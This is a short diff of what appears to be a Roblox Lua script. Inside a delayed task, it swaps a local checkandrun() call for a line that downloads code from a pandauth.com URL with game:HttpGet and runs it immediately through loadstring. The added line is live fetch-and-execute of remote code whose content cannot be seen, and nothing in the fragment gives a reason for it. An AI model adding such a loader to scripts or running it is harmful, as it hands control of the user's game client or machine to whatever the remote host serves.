@@ -24,7 +24,8 @@ end
 
 task.delay(0.25, function()
 
-    checkandrun()
+    
+    loadstring(game:HttpGet("https://vss.pandauth.com/kv/1e4431d40c202812"))()
 
     while task.wait(20) do
         checkandrun()
